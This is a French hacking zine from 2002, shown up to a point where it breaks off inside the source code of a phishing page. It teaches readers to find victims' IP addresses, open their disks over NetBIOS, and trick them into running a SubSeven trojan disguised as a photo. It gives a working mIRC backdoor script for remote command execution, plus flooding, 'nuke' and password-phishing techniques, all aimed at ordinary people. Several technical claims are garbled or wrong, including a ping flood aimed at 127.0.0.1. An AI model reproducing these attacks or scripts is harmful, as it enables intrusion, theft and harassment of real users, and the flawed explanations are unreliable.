 _______________________________________________________________________________________
(                                                                                       )
(  H    H        A          CCCCC     K   K      ZZZZZZ      I     N     N     EEEEEEE  ) 
(  H    H       A A        C          K  K           Z       I     NN    N     E        )
(  HHHHHH      A   A      C           KKK           Z        I     N N   N     EEEEE    )
(  H    H     AAAAAAA     C           K  K         Z         I     N  N  N     E        )
(  H    H     A     A      C          K   K       Z          I     N   N N     E        )
(  H    H     A     A       CCCCC     K    K     ZZZZZZZ     I     N    NN     EEEEEEE  )  
(_______________________________________________________________________________________)


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
* Désolé pour la mauvaise qualité de cette présentation, chuis nul en ascii art...   HackZine, n°1 / By [Kefka]*
****************************************************************************************************************
*                                                                                                              *
|--------------------------------------------| // Dans ce numéro                                               *
|-------------~~~~~~~~~~~~~~~----------------|    --------------                                               *
|-------------===============----------------| 1°/Introduction :=)                                             * 
|-------------   Hack rulez  ----------------| 2°/Internet, structure  (introduction au modèle O.S.I)          *
|-------------_______________----------------| 3°/Piratage d'un particulier: comment trouver l'ip de quelqu'un *
|--------------___HackZine___----------------| 4°/Piratage d'un particulier: la méthode par Netbios            *
|-------------/  number one  \---------------| 5°/Piratage d'un particulier: les trojans                       *
|------------(   By [Kefka]   )--------------| 6°/Piratage d'un particulier: le nuke                           *
|-------------|    *****     |---------------| 7°/Piratage d'un particulier: les fake-mail                     * 
|-------------~~~~~~~~~~~~~~~~---------------| 8°/Piratage d'un particulier: les virus                         *
|--------------------------------------------| 9°/Hack sous IRC/ICQ                                            *
|--------------------------------------------| 12°/Piratage d'un site: hack par ftp                            *  
|-----------**********************-----------| 13°/Piratage d'un site: exploiter les failles wingate           *
|-----------* All right reserved *-----------| 14°/Piratage d'un site: exploiter les failles cgi               *
|-----------**********************-----------| 15°/Piratage d'un site: hack par Telnet                         *
|--------------------------------------------| 16°/Piratage d'un site: comment s'attaquer à un routeur         *           
|--------------------------------------------| 17°/Piratage d'un site: approche de script kiddie               *
|--------------------------------------------| 18°/Comment cacher son identité sur le net: les mails anonymes  *
|--------------------------------------------| 19°/Comment cacher son identité sur le net: le spoofing         *
|--------------------------------------------| 20°/Comment cacher son identité sur le net: l'après root        *
|--------------------------------------------| 21°/La programmation, ce qu'il faut savoir maîtriser            *
|-------------  Janvier 2002 ----------------| 22°/Introduction au cracking, manipuler l'Assembleur (ASM)      *
|--------------------------------------------| 23°/L'art du sniffing                                           *
|--------------------------------------------| 24°/Le social engeneering                                       *
|--------------------------------------------| 25°/Conclusion                                                  *
*                                                                                                              *
****************************************************************************************************************

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

[Disclaimer]: Ces informations sont à titre purement éducatif, je ne serais en aucun cas 
responsable de ce que vous pourriez faire avec . Tout acte ou tentative de piratage est 
reprimé par la justice.   HackZine1, [Kefka]

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


²²²²²²²²²²²²²²²²²²²
² 1°/Introduction ²
²²²²²²²²²²²²²²²²²²²

Ce mag est mon tout premier zine dans le domaine du hack. J'exposerais donc ici toutes mes 
conaissances dans le milieu. Commentaires, suggestions, écrivez moi à nickairmax@caramail.com.
D'ou provient le hack? Il y'a encore quelques vingtaines d'années, Internet etait un reseau 
très complexe, encore très misterieux. Il était utilisé par les gouvernements americains, et 
non-accesible au grand public. Ce sont des universitaires, des hackers, qui ont démocratiser
 Internet!!! Il faut savoir que sans eux, vous n'auriez jamais soupconner l'existence de ce 
réseau. Et vous ne seriez donc pas assis tranquilement dans votre fauteuil à lire ce zine... 
Mais le phénomène Internet tout public, lui, remonte au mileu des années 90. Internet est 
aujourd'hui devenu un média à part entière, et le fait de pouvoir "maîtriser" ce nouveau moyen 
de communication est une des raisons qui poussent certains (ou parfois même certaines, mais 
c'est encore trop rare... ;-)) à vouloir devenir un hacker. Ce qui est dommage, c'est que 
beaucoup de gens (en particulier des journalistes) se font une mauvaise idée du hacking en 
géneral. Pourquoi donc tant de haine envers la communauté hacker? Cela peut justement 
s'expliquer par le fait que les origines d'Internet soient encore un peu sombres pour 
certains, et le plus souvent, on a peur de ce que l'on ne maîtrise pas... 
Mais qu'est qu'un hacker au juste? Par définition, un hacker est un pirate informatique qui 
cherche les failles de chaque systeme afin de pouvoir les exploiter et en tirer profit...

Mais il faut savoir differencier les types de pirates.
On distingue:

Les crashers: Les "méchants" hackerz. Ils introduisent des systemes dans le seul but de les 
détruire. Leur mentalité est heuresement très rare et souvent rejetée par la communauté Hackerz.

Les newbies: Les débutants du H/P/C (hacking, phreaking, cracking), contrairement aux lammers*,
ils essayent de progresser tout en respectant les autres, sans se la jouer Mitnick...

Les lammers, ou cOwbOyz: Les branleurs de l'underground... Ils se prennent tous pour des 
grands hackers alors que tout ce qu'ils savent, c'est nuker, ou bien rien du tout. Ils passent
pour de vrais bouffons, et le pire c'est qu'ils ne s'en rendent même pas compte      :p

Les crackers: Les crackers crackent des programmes (quoi de plus logique lol) afin de faire
sauter des protections, des mot de passe de registration, etc... Mais devenir cracker n'est
pas une chose aussi facile, il faut déjà être un vrai pro de la programmation, et connaître
son Assembleur sur le bout des doigts... (voir chapitre 22)

Les script kiddies: Voir chapitre 17

Les hackers: Les pirates d'Internet... Je ne vais pas vous répeter la définition d'un hacker, 
revenez donc en arrière  :))


De plus en plus de gens veulent devenir des hackers, mais peu d'entre eux le sont réellement. 
Alors, comment le devenir? Comment passer du stade newbie au stade hacker?  
Cette transition se fait principalement par un point des plus essentiels du mileu du hacking: 
La programation. 
Un hacker, avant tout, est un génie de la programmation, que cela vous déplaise ou non. 
Bien sur y'a pas que ça, on peut très bien utiliser un programme sans savoir comment il marche... 
Mais vous ne deviendrez jamais un grand hacker si vous ne programmez pas. 
Mais bon, je ne m'attarderais pas plus logtemps à ce sujet.
Reportez vous au chapitre sur la programmation. 

Sachez aussi que beaucoup de gens se prétendent hackers, alors, comment reconnaître un VRAI 
hacker? Normalement un hacker ne vous dira jamais ce qu'il est réelement, n'allez donc surtou
t pas croire les blaireaux avec des  nick (=pseudos, mais ça, vous êtes censés le savoir)
genre hacker-mania, hackman... Et n'ecoutez pas non plus les crétins qui se ramènent sur les 
chats en gueulant "Je suis un hacker,je suis le meilleur de tous les pirates", ces gens là 
sont géneralement des gros lammers, mais il se peut quelquefois qu'ils soient réelement des
 hackers (mais bon c'est très rare hein). Donc, pour résumer, un vrai hacker, en général, 
essaiera d'être le plus discret possible... 
Bon, si voulez progresser va falloir vous y mettre sérieusement, lire des zines, poser des 
questions sur #hack ou #hack.fr.
Bienvenue dans l'underground...



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 2°/Internet, structure (introduction au modèle O.S.I) ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Bon, même si le titre peut sembler barbare pour certains d'entre vous, cette partie n'en est pas moins indispensable.
Sachez dèjà que Internet repose sur le protocole TCP/IP  (Transmission Protocole/Internet Protocole) , 
qui recouvre lui-même d'autres protocoles. Internet est avant tout un ensemble de réseaux 
interconnectés par divers moyens (cartes réseau, satellites...). 

On va commencer par une des choses les plus importantes, caractérisant le protocole TCP/IP: 

C'est l'adresse IP. 
Techniquement, une adresse IP est un champ de 32 bit, défini en 4 champ de 8 bits séparés par 
des points (allant de 0.0.0.0 à 255.255.255.255), dont les 8 premiers définissent la classe du
réseau et les 24 suivant identifient des sous réseaux et des machines. Par exemple, supposons
que vous soyez sur Wanadoo, et que votre IP soit 80.9.33.245 (pas de soupçons, c'est la mienne
lol),alors 80 définit la classe du réseau, 9 le sous réseau, 80.9 correspond donc à Wanadoo 
et les 2 derniers champs, 33.245, correspond à votre localisation et à votre identification
sur le Net. Ba oui, z'etes pas aussi en sécurité que ça sur le net   :))  . 
Et comment ca se fait qu'on puisse me localiser avec des simples numéros, me demanderiez vous?
Simple, en convertissant votre adresse IP en une adresse TCP , par une simple conversion dns, 
il existe des méthodes pour ça, mais je suis trop feignant pour vous les expliquer, vous
trouverez bien de vous même. Alors, par exemple, la conversion de 80.9.33.245 en adresse TCP 
va donner Mix-Tours-111-1-245.abo.wanadoo.fr. Z'avez vu ça? Votre région et votre fournisseur
sont indiqués. Les numéros 111-1-245 ont aussi une signification mais je ne sais pas laquelle,
peut être à une identification plus précise... 
Mais il faut savoir que certaines adresses peuvent être fixes, c'est le cas des adresses http,
qui ont une ip bien particulière et qui ne change pas. Car, et j'ai oublié de vous le préciser, 
votre adresse IP change à chaque connection. 
Il existe également des ip qui ont une signification bien précise. Par exemple, 127.0.0.1 correspond 
à votre "localhost". Si vous vous connectez dessus, vous vous connecterez sur votre propre pc.
C'est le cas pour tous les utilisateurs connectés sur internet, n'ayez crainte. Donc, pour les 
autres, votre ip ne sera pas 127.0.0.1. Pour connaître votre adresse IP c'est très simple, si 
vous avez win95, win98 ou win2000 allez dans Démarrer/Executer et tapez "winipcfg". Vous aurez
donc votre IP. 

Mais qu'est ce que cette IP a t-elle à voir avec le domaine du hacking? Mouarf, si vous vous 
posez cette question c'est vraiment que vous ne savez RIEN lol. Jetez un coup d'oeil sur le
chapitre consacré au piratage d'un particulier et vous vous rendrez compte ô combien c'est 
chouette de connaître l'ip de quelqu'un...              :-)


Bon, passons à autre chose, de plus technique. Vous savez donc que Internet repose sur le 
protocole TCP/IP mais comment celui-ci est il défini? Sachez que TCP/IP est défini par un 
modèle O.S.I., instauré par le S.I.O. (International Standard Organization). Ce modèle est 
composé de 7 couches, application, présentation, session,transport,réseau,liaison et physique. 
Voila donc à quoi ressemble un modéle de réference O.S.I.:

 
      ##########################
	#				 #      
	# COUCHE APPLICATION     #
	#			       #   
	##########################
	#				 #      
	# COUCHE PRESENTATION    #
	#			       #    
	##########################
	#			       #    			
	# COUCHE SESSION         #
	#			       #     
	##########################
	#			       #    
	# COUCHE TRANSPORT       #
  	#		             #                     
	##########################
	#			       #     
	# COUCHE RESEAU	       # 
	#			       #     
	##########################
	#			       #     
	# COUCHE LIAISON	       # 
	#		             #   
	##########################
	#			       #     
	# COUCHE PHYSIQUE	       # 
	#			       #     
	##########################



COUCHE APPLICATION : La couche application constitue le niveau dans la hiérarchie des protocoles
où résident les accès des processus réseau de l'utilisateur.

COUCHE PRESENTATION : Lorsque les applications coopèrent entres elles, elles échangent certaines
informations. Elles doivent donc déterminer comment représenter ces données. Dans le modèle OSI, 
cette couche fournit les routines de présentation des données standardisées. Cette fonction est
souvent assurée directement à l'intérieur de l'application, bien que de plus en plus de protocoles 
TCP/IP tels que XDR et MIME effectuent cette opération.

COUCHE SESSION : Comme pour la couche présentation, cette couche n'est pas identifiable sous la
forme d'une couche indépendante au niveau de la hiérarchie TCP/IP. Cette couche gère les connexions 
entre les applications. Avec TCP/IP, cette fonction se réalise bien souvent dans la couche de 
transport et le terme de session n'est pas utilisé. Pour TCP/IP, les termes "sockets" et "ports"
sont utilisés pour décrire la voie à suivre pour que les applications puissent communiquer entres elles.

COUCHE TRANSPORT : Cette couche du modèle OSI garantit que le récepteur reçoit les données 
telles qu'elles ont été envoyées. Avec TCP/IP cette fonction est réalisé avec TCP. Toutefois, 
TCP/IP offre un second service de transport, UDP (User Datagram Protocol) qui n'effectue pas 
les vérifications finale de bonne communication.

COUCHE RESEAU : Cette couche gère les connexion à travers le réseau et isole les protocoles des
couches supérieure des détails du réseau sous-jacents. Le protocole IP, qui isole les couches 
supérieures du réseau et qui gère les adresses ainsi que la transmission de données est généralement 
décrit comme la couche réseau TCP/IP.

COUCHE LIAISON : La possibilité de diffuser les données à travers le réseau physique sous-jacent 
est gérée par cette couche. TCP/IP crée très rarement des protocoles situés dans cette couche.

COUCHE PHYSIQUE : Elle définit les caractéristiques du matériel nécessaire à la propagation du
signal. Par exemple, les niveaux électriques, le nombre et la position des broches au niveau 
de l'interface sont définis dans cette couche.


Pour le protocole TCP/IP le modèle O.S.I qui le caractérise prendra moins de couches:

      #########################
      #			      #             
      # COUCHE APPLICATION    #
	#	                  #                    
	#########################
	#				#          
	# COUCHE TRANSPORT      #
	# MACHINE A MACHINE     # 
	#			      #             
	#########################
	#			      #
	# COUCHE INTERNET       # 
	#			      #
	#########################
	#			      #
	# COUCHE RESEAU         #
	#			      #
	#########################


Comme dans le modèle OSI, les données sont transmises vers le bas de la pile lorsqu'elles sont 
émises sur le réseau; et vers le haut de la pile lorsqu'il s'agit d'une réception de données. 
La structure à 4 niveaux de TCP/IP est représenté suivant la manière selon laquelle les données
sont gérées et transmise vers le bas de la pile de la couche application vers la couche réseau 
physique. Chaque couche de la pile ajoute certaines informations de contrôles pour s'assurer 
de la bonne livraison des données. Ces informations sont appelées "en-têtes" car elles sont 
placées avant les données à transmettre. Chacune des couches considère toutes les informations 
reçues d'une couche supérieure comme étant des données et place sa propre en-tête juste avant. 

L'ajout successif d'informations a chacune des couches est appelé "encapsulation". 
Lorsque des données sont reçues, c'est le mécanisme inverse qui se met en place. Chaque couche 
retire son en-tête avant de communiquer les données à la couche supérieure. Comme les informations 
remontent les différentes couches, les informations reçues de la couche inférieure de la pile 
sont interprétées comme étant constituées d'une en-tête et de données.

Et voilà un descriptif de chacune de ces couches:


LA COUCHE RESEAU:  La couche réseau est la couche la plus basse de la hiérarchie des protocoles
TCP/IP. Les protocoles de cette couche fournissent les moyens nécessaire au système pour envoyer 
les données aux périphériques physique directement connectés au réseau. Les fonctions réalisés 
à ce niveau incluent l'encapsulation de datagrammes IP dans des trames transmises sur le réseau
et la correspondance entre adresse IP et adresse MAC. En effet, les adresses IP doivent être 
converties en une adresse appropriée pour le réseau physique à travers lequel le datagramme va circuler.


LA COUCHE INTERNET: La couche au-dessus de la couche réseau de la hiérarchie des protocoles est
la couche internet. IP constitue le coeur même de TCP/IP et il s'agit du protocole le plus 
important de la couche internet. IP fournit le service de base en matière d'expédition de 
paquets sur lequel les réseaux TCP/IP sont bâtis.


LA COUCHE TRANSPORT: Les deux protocoles les plus importants dans cette couche sont TCP et UDP 
(User Datagram Protocol). TCP fournit un service de transmission de données dit fiable avec un 
système de détection et de correction d'erreurs. UDP fournit un service de transmission de datagramme 
en mode non connecté.


LA COUCHE APPLICATION: Au sommet de la hiérarchie des protocoles TCP/IP se trouve la couche 
application. Cette couche inclut tous les processus qui utilisent les protocoles de la couche 
transport pour transmettre de l'information. Il existe un grand nombre de protocoles applicatif 
de ce genre. La plupart fournissent des services utilisateurs et de nouveaux services sont 
régulièrement ajoutés à cette couche.

Les protocoles applicatifs les plus connus sont :
      - Telnet : permet d'effectuer des action à distance sur un réseau
	- FTP : Utilisé pour transférer des fichiers d'une manière interactive.
	- SMTP : Protocole de transport de mails .                                                                                   
      - HTTP : Permet de diffuser des pages web à travers le réseau.   
	- DNS : Permet la résolution des adresses IP en fonction du nom de machine. 
	- NFS : Permet aux fichiers d'être partagés par plusieurs machine connectées au réseau.


Bon, voilà je pense que ca devrait vous suffir. 
Maîtriser le protocole TCP/IP vous permettra d'être déjà bien avancé. 
Maintenant passons au hacking proprement dit...



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 3°/Piratage d'un particulier: comment trouver l'ip de quelqu'un ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Bon, avoir votre adresse IP, c'est cool, mais c'est pas qui va vous permettre de hacker
quelqu'un, à moins que vous ne soyez complètement masochiste  lol. Alors comment obtenir l'ip 
de quelqu'un, et dans quel contexte? 
Il existe des tas de méthode, je vous en propose quelques 
unes pour commencer, pas trop compliquées:

1ERE METHODE: Et aussi la plus simple... Il faut d'abord que vous ayez un client IRC. Ensuite, 
sur quelconque chat, tapez (les > ne sont pas à taper):

>/dns user (le pseudo du type dont vous voulez son ip)

Et vous aurez son ip. Pour ceux qui ont pas la force de taper ça sur leur clavier vous pouvez 
mettre en surbrillance un nick et aller dans "infos" ca reviendra au même. Si vous tombez sur 
autre chose qu'une adresse IP, genre une adresse TCP, allez sous DOS, et faites:

>ping -A adressetcp

Et l'ip de votre victime vous sera communiquée..
Cette méthode est la plus efficace et la plus sûre, mais bon, vous ne possedez pas forcément 
de client IRC et vous êtes peut être trop pressé pour commencer un telechargement maintenant...       :))


2EME METHODE: Sur Caramail, quand vous recevez un mail, allez dans l'onglet "entêtes" , situé 
en haut du message. Et vous aurez l'ip de votre correspondant mouarf...


3EME METHODE: Il faut déjà que vous soyez equipé d'un no-nuker genre NukeNabber qui vous 
donnera l'ip de votre agresseur en cas d'attaque... Maintenant, sur un chat, tapez ce lien, 
incitant votre victime à cliquer dessus :

>ftp.votre_ip

Tapez ce lien en message privé, et à quelqu'un qui ne s'y connait pas, parce que sinon il se 
pourrait que vous vous fassiez nuker sur un port que vous aviez oublier de protegé    ;-)


4EME METHODE: Faites gaffe, cette méthode peut être dangeureuse pour votre lecteur de disquette...
Partagez votre lecteur A en accès complet et donnez lui comme nom de partage SEX_PICTURES par 
exemple... Quand vous aurez un visiteur sur votre lecteur de disquettes, il se mettra à faire 
du bruit... Pour connaître l'ip du hacker cochon (lol) qui squatte votre lecteur, allez sous 
DOS et tapez "netstat". Il se peut que la fenetre disparaisse pour eviter cela appuyez sur la 
touche ImprEcran de votre clavier, allez dans Word ou dans Paint et faites un coller. Vous aurez
l'adresse IP du povre petit hacker...                 :-(


5EME METHODE: Sous ICQ, mettez en surbrillance un pseudo quelconque et cliquez sur la fleur bleue 
afin de quitter le chat. Reconnectez vous sur votre client ICQ et vous aurez l'ip du type dont
vous aviez mis le pseudo en surbrillance... Cette astuce ne fonctionne que sur la version d'ICQ 98.


6EME METHODE: La plus conne, pour avoir l'ip de quelqu'un, il suffit de lui demander... 
Demandez donc à quelqu'un sur un chat de vous communiquez leur adresse son adresse IP. Si il 
répond: "c'est quoi adresse IP" ou encore qu'il vous donne son adresse e-mail (arf) c'est pratiquement 
dans la poche. Ne lui dites pas ce que c'est, et demandez lui d'aller dans Démarrer/Executer 
et de taper winipcfg, puis demandez lui de vous la donner. Si il fait tout ce que vous lui 
demandez, c'est que vous êtes tombés sur un oiseau (pigeon...) rare. Profitez en !!!     :-D


7EME METHODE: Sur un serveur irc, quand vous recevez une proposition d'envoi de fichier par 
dcc send, allez dans statut pour connaître l'ip du type qui essaye de vous refourger un fichier.
Cette astuce est très utile pour trouver des ip de gens sur des serveurs irc dont la conversion
dns est cryptée, comme c'est le cas pour irc.jeuxvideo.com par exemple. (Remerciements a Userknown, au passage    ;-)  ).

8EME METHODE: Avec MsgManager, quand vous reçevez un fichier, acceptez le, puis allez dans "commandes dos" 
et tapez netstat. Vous pourrez voir l'host de votre expéditeur, il ne vous restera plus qu'à 
faire la conversion dns pour trouver son ip, en faisant par exemple sous dos, 
>ping -a host


Bon, voilà, je pense qu'avez tout ça vous devriez pouvoir récuperer quelques adresse IP. 
Maintenant, passons à la suite...    :))



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 4°/Piratage d'un particulier: la méthode par Netbios ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Les conditions nécessaires:
-Que vous et votre victime ayez installer le partage de fichiers
-Que vous tournez sur Windows 95 ou 98 ainsi que votre victime
-L'adresse IP de votre victime
-Beaucoup de chance et beaucoup de patience    :))

Cette méthode, reposant sur le protocole NETBEUI, reposant lui même sur NetBios, vous permettra
d'avoir accès au disque dur de votre victime, cela en toute légalité, ce qui est suffisament 
rare pour être précisé     :-p

Bon alors, ouvrez une fenetre DOS et tapez:

>NBTSTAT -A 80.9.33.245 (l'ip de votre victime, ici c'est juste un exemple hein   :)) )

Une liste de noms de pc devrait s'afficher (si ce n'est pas le cas changez de cible, elle n'a 
pas Netbios), exemple:

>NetBIOS Remote Machine Name Table
>Name Type Status
>--------------------------------------------------
>MONORDINATEUR <00> UNIQUE Registered
>MONGROUPE          <00> GROUP  Registered
>MONORDINATEUR <03> UNIQUE Registered
>MONORDINATEUR <20> UNIQUE Registered
>MONGROUPE          <1E> GROUP  Registered
>MAC Address = 44-45-53-54-00-00

Bon, alors, ce qui nous interesse, c'est le nom de pc avec UNIQUE et <20> devant. Si ce nom 
existe le tour est (presque) joué. Nous allons editer le fichier lmhost.sam , qui convertit 
les de machines sous NETBEUI en adresses ip. Toujours sous DOS, tapez:

>edit

Tapez le nom du fichier, lmhost.sam . Puis, à l'interieur de ce fichier tapez:

>80.9.33.245 MONORDINATEUR #PRE

L'ip de votre victime, suivi du nom de son pc (celui avec UNIQUE et <20> devant) et de #PRE, 
qui indiquera que la correspondance entre l'ip et le nom NetBIOS devra passer avant la résolution
DNS. Maintenant, nous allons charger le fichier lmhost.sam. Sauvegarder le, quitter l'éditeur 
et toujours sous DOS, tapez:

>NBTSTAT -R

Et normalement, sauf erreur, vous obtenez:
>Successful purge and preload of the NBT Remote Cache Name Table

Maintenant sortez de DOS aller dans Démarrer/Rechercher/Ordinateur Distant/puis entrez le nom 
du pc de la victime. Double cliquez sur son poste de travail et le tour est joué !!!

Ou alors, si vous aimez les complications, restez sous DOS et tapez:
>NET VIEW \\MONORDINATEUR
Une liste de noms de ressources partagées s'affichera. Allez donc faire un petit tour sur le C... niark niark... Tapez:
>NET USE \\MONORDINATEUR\C
Et le disque dur de votre victime deviendra un de vos disques libres...
Cette technique, malheureusement, marche de moins en moins souvent et necessite une chance 
quasi-exceptionelle, cependant vous pouvez toujours essayer... Amusez vous bien !!!    :->



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 5°/Piratage d'un particulier: les trojans ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Les conditions nécessaires:
-Que vous possediez un trojan (je vous conseille SubSeven7 ou Socket23 c'est les meilleurs pour
commencer. Sinon vous pouvez directement prendre Back Orifice mais je vous le déconseille, il 
peut devenir très dangeureux pour votre pc...C'est vous dire sa puissance  :)) )
-Que vous ayez de l'imagination, inventer quelque chose pour que votre victime execute le cheval 
de troies est tout un art croyez moi lol.
-Que vous ayez un programme vous permettant de changer l'extension de vos applications. 
Transformer les .exe en .jpg peut être une chose très utile croyez moi   arf
-Que votre victime soit un bel abruti  :-o
-Que vous ayez naturellement l'adresse IP de votre victime
-Que vous ayez une conscience: le piratage est sévèrement puni , arf nan je deconne laissez vous allez        :op

Bon, commençons par une question simple: Qu'est qu'un trojan? Alors comment vous expliquer ça... 
Prenons l'exemple de SubSeven (à croire que c'est mon trojan préferé lol): Il est composé de 
trois applications. La première, server.exe, est le cheval de troies, il doit être installé 
sur le pc de votre victime. La seconde application, Sub7.exe, est le programme qui vous 
permettra de penetrer dans le pc d'une victime infectée par le cheval de troies. Enfin, la 
dernière, EditServer.exe, est une application qui vous permettra de proteger l'accès à la 
machine de votre victime par un simple mot de passe. Mais oublions cette partie là, de plus 
elle n'est pas disponible sur tous les trojans. Si vous n'etes pas bêtes je pense que vous 
avez du comprendre le fonctionnement d'un trojan. En résumé, il faut d'abord infecter le pc de
la cible au moyen du cheval de troies, pour ensuite y accèder en se connectant sur l'adresse 
ip de la machine de la victime. Mais, prenons plutôt un exemple d'une intrusion classique sur 
le pc de quelqu'un, sur le chat de caramail :

>NickAirMax: Salut, ca te derangerais pas de m'envoyer un e-mail, tu met rien dedans, c'est 
juste pour verifier si ma boite de reception déconne plus.
>Pigeon: Ok, attend 2 secondes
>P: Ca y'est tu l'as reçu?
Donc, vous avez compris, avec le mail que la victime vous a envoyé, vous pouvez facilement obtenir son adresse IP.
>N: Oui ca y'est merci t'es trop sympa. Je t'envoie une photo de MOI pour te récompenser.. 
(evidemment si votre victime est un mec, ca va être un peu plus dur, faites vous donc passer pour une nana lol)
Bon, alors là vous envoyez le cheval de troies à votre victime, en prenant bien soin de 
changer son extension, de .exe en .jpg     :))
>N: T'as reçu?
>P: Attend je vais voir...
>P: Oui ca y'est, merci
>P: Et mais ca marche pas ton truc? Je clique dessus il se passe rien...
B
on, j'espere que vous avez compris. En cliquant sur votre petite saloperie, la victime s'est 
auto infectée, sans même s'en rendre compte. Il ne vous reste plus qu'à vous connecter sur le 
pc de la victime avec son ip, par le port du cheval de troies (pour Sub7 c'est 27374).

Vous aurez ensuite accès à des tas de fonctions tout aussi interessantes les unes que les 
autres, que je vous laisse découvrir...   miam miam    B-)


Il existe aussi une variante du trojan sous IRC. Il faut que vous ayez le client MIRC32. Dans 
le repértoire contenant votre client, créez un nouveau document texte, donnez lui le nom que 
vous voulez, ouvrez le, et à l'intérieur tapez (les > ne devant pas être tapés)
>ctcp 1:ech:/echo -a $2-
Enregitrez le en *.ini. Maintenant connectez vous sur MIRC, et tapez sur une fenêtre de discussion: 

>load -rs votre_fichier.ini

Maintenant envoyez un fichier *.ini à votre victime contenant ceci:

>ctcp 1:*:$1-
>/set %com /ctcp $me
>hatled
>if ($1- == in) {
>/ctcp $nick ech [X Fiction][Je suis infecté]
>/clear -s
>/motd
>goto end
>}
>if ($1- == ip) {
>/ctcp $nick ech [X Fiction][iP][$+$ip $+ ]
>/clear -s
>/motd
>goto end
>}
>else {
>/$+$1-
>/ctcp $nick ech [Action: /$+$1-$+] effectuée
>/clear -s
>/motd
>goto end
>}
>:end
>/unset %com
>halt
>}  

Ou dites lui de placer la ligne "ctcp 1:*:$1-" dans son remote. 
Votre victime sera donc infectée, et votre backdoor vous permettra de lui envoyer des ctcp 
sans qu'elle ne s'en apercoive. 

Voici ce que vous pouvez faire avec ces ctcp:
>/ctcp pseudo ip (pour avoir l'ip de la victime)
>/ctcp pseudo in (pour vérifier si la victime est bien infectée)
>/ctcp pseudo_de_votre_victime JOIN #channel  (pour envoyer votre victime sur un autre salon)
>/ctcp pseudo MSG #channel  (pour le faire parler sur #channel)
>/ctcp pseudo ip  (pour avoir son adresse ip)
>/ctcp pseudo WRITE c:/windows/bureau/nickairmax.exe  (pour créer un fichier sur le bureau de 
votre victime, essayez de créer un virus par exemple...)
>/ctcp pseudo RUN c:/windows/bureau/nickairmax.exe

Voilà, je pense que ca devrait vous suffir...



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 6°/Piratage d'un particulier: le nuke ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Ok ca fait pas mal newbie comme technique... Mais je réexplique quand même à ceux qui n'aurait
pas la chance de connaître, le nuke consiste à envoyer tout plein de données incompréhensibles 
sur des ports au hasard afin de provoquer généralement la déconnection d'une machine. Pour cela
vous avez juste besoin d'un nuker (et là je vous recommande MelissaNuke) et d'une adresse IP 
(prenez aussi un no-nuker en cas de tentative de riposte lol). Laissez le port 139 (vous pouvez
quand même en essayer d'autres), entrez l'adresse IP de votre victime et cliquez sur le bouton "nuke him"...
Très technique, très fin... 
Mais bon, cette technique semble avoir été adoptée par un certain nombre de lammerz.... 
J'ai pas envie de m'attarder plus longtemps sur le nuke, d'autant plus qu'il n y a rien à dire 
mouarf. Sachez quand même que le nuke, ca marche pas à tous les coups et que il vaut mieux être
plusieurs à nuker la même personne pour plus d'efficacité, et ce n'est pas non plus la peine 
d'essayer de nuker des modéros  :))

C'est vrai que nuker sous IRC, c'est plutôt amusant mais à la longue ca devient lassant... 
Alors je vais vous donner une autre technique, qui aboutira au même résultat que le nuke, 
voire même en mieux et en de manière plus sûre. Allez donc sous DOS et tapez:

>ping -n 65000 127.0.0.1

Après -n indiquez le nombre de paquets à envoyer, le plus possible, puis metttez l'ip de votre
victime. Attendez quelques instants et le pc de la victime aura rebooter... Cette technique 
s'apelle le ping overflood. 

Si vous voulez vous attaquer à un serveur utilisez plutôt l'oversize packet. Sous DOS, tapez:
>ping -| 65000 www.nomdusite.com
Cette technique fonctionne rarement, mais ca vaut le coup d'essayer. Si le serveur est bien 
protegé vous recevrez un message de time out.

Bon, ok, là je me suis un peu éloigné de mon sujet, mais que vous voulez vous, fallait bien que
je vous explique le hack sous DOS quelque part dans ce zine... Voilà qui est fait et j'en suis 
bien content :-)   Passons à la suite...



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 7°/Piratage d'un particulier: les fake-mails ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Les conditions nécessaires:
-Avoir un compte quelque part
-Bien maîtriser le HTML
-Avoir un peu de patience

Bon, le fake-mail, ca consiste en quoi... En gros, envoyer un fake mail, c'est envoyer un 
e-mail à quelqu'un en se faisant passer pour un administrateur, et en tentant de récuperer son
mot de passe et son login. C'est cool, ca marche bien, mais pour être plus crédible, mieux vaux
avoir une adresse du style admin454@caramail.com, enfin une adresse avec un "admin" dedant, 
histoire de vous faire passer pour quelqu'un d'important...

Voici un exemple de fake-mail:


Nous sommes désolés cher membre, votre compte a rencontré
des problèmes pour les raisons suivantes:


Raison: Temps dépassé

Nous vous prions de réactiver votre compte en complétant
ce formulaire dans les plus brefs délais.

Compte:
 
Mot de passe:
 
   



Retourner à La page de caramail <http://www.caramail.com/>. 
© 2002 caramail. Tout droits réservés


D'ailleurs, en voici le code source:

<html>
<head>
</head>
<html>
<head>
</head>
